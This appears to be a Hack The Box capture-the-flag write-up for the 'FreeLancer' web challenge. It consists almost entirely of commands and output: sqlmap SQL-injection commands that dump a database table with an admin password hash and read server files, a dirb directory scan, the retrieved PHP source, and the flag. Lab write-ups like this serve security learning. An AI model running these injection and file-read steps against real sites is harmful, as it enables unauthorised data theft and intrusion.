## FreeLancer ##

![OWASP](https://github.com/SagiUziel/HackTheBox/blob/master/Web/FreeLancer/ZAP.JPG)

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id --tables

Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+
```

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id -T safeadmin --dump

Database: freelancer
Table: safeadmin
[1 entry]
+------+----------+--------------------------------------------------------------+---------------------+
| id   | username | password                                                     | created_at          |
+------+----------+--------------------------------------------------------------+---------------------+
| 1    | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |
+------+----------+--------------------------------------------------------------+---------------------+
```
```
sagi@kali:~$ dirb http://docker.hackthebox.eu:30707

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul 18 11:29:17 2020
URL_BASE: http://docker.hackthebox.eu:30707/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://docker.hackthebox.eu:30707/ ----
==> DIRECTORY: http://docker.hackthebox.eu:30707/administrat/                                                                                                                
==> DIRECTORY: http://docker.hackthebox.eu:30707/css/                                                                                                                        
+ http://docker.hackthebox.eu:30707/favicon.ico (CODE:200|SIZE:32038)                                                                                                        
==> DIRECTORY: http://docker.hackthebox.eu:30707/img/                                                                                                                        
+ http://docker.hackthebox.eu:30707/index.php (CODE:200|SIZE:9541)                                                                                                           
==> DIRECTORY: http://docker.hackthebox.eu:30707/js/                                                                                                                         
==> DIRECTORY: http://docker.hackthebox.eu:30707/mail/                                                                                                                       
+ http://docker.hackthebox.eu:30707/robots.txt (CODE:200|SIZE:0)                                                                                                             
+ http://docker.hackthebox.eu:30707/server-status (CODE:403|SIZE:311)                                                                                                        
==> DIRECTORY: http://docker.hackthebox.eu:30707/vendor/                                                                                                                     
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/administrat/ ----
==> DIRECTORY: http://docker.hackthebox.eu:30707/administrat/include/                                                                                                        
+ http://docker.hackthebox.eu:30707/administrat/index.php (CODE:200|SIZE:1213)                                                                                               
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/mail/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/administrat/include/ ----
+ http://docker.hackthebox.eu:30707/administrat/include/index.html (CODE:200|SIZE:0)                                                                                         
                                                                                                                                                                             
-----------------
END_TIME: Sat Jul 18 11:48:47 2020
DOWNLOADED: 13836 - FOUND: 6

```



```
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
  header("location: panel.php");
  exit;
}

// Include config file
require_once "include/config.php";

// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = "";

// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

    // Check if username is empty
    if(empty(trim($_POST["username"]))){
        $username_err = "Please enter username.";
    } else{
        $username = trim($_POST["username"]);
    }

    // Check if password is empty
    if(empty(trim($_POST["password"]))){
        $password_err = "Please enter your password.";
    } else{
        $password = trim($_POST["password"]);
    }

    // Validate credentials
    if(empty($username_err) && empty($password_err)){
        // Prepare a select statement
        $sql = "SELECT id, username, password FROM safeadmin WHERE username = ?";

        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);

            // Set parameters
            $param_username = $username;

            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Store result
                mysqli_stmt_store_result($stmt);

                // Check if username exists, if yes then verify password
                if(mysqli_stmt_num_rows($stmt) == 1){
                    // Bind result variables
                    mysqli_stmt_bind_result($stmt, $id, $username, $hashed_password);
                    if(mysqli_stmt_fetch($stmt)){
                        if(password_verify($password, $hashed_password)){
                            // Password is correct, so start a new session
                            session_start();

                            // Store data in session variables
                            $_SESSION["loggedin"] = true;
                            $_SESSION["id"] = $id;
                            $_SESSION["username"] = $username;

                            // Redirect user to welcome page
                            header("location: panel.php");
                        } else{
                            // Display an error message if password is not valid
                            $password_err = "The password you entered was not valid.";
                        }
                    }
                } else{
                    // Display an error message if username doesn't exist
                    $username_err = "No account found with that username.";
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }
        }

        // Close statement
        mysqli_stmt_close($stmt);
    }

    // Close connection
    mysqli_close($link);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Freelancer Login</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
  <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group <?php echo (!empty($username_err)) ? 'has-error' : ''; ?>">
                <label>Username</label>
                <input type="text" name="username" class="form-control" value="<?php echo $username; ?>">
                <span class="help-block"><?php echo $username_err; ?></span>
            </div>
            <div class="form-group <?php echo (!empty($password_err)) ? 'has-error' : ''; ?>">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
                <span class="help-block"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
        </form>
    </div>
</body>
</html>
```

```
>  python3 sqlmap.py -u http://docker.hackthebox.eu:30866/portfolio.php?id=1 --file-read /var/www/html/administrat/panel.php
```


```
<?php
// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: index.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
  <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
<br><br><br>
        <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
    </div>
</body>
</html>
```
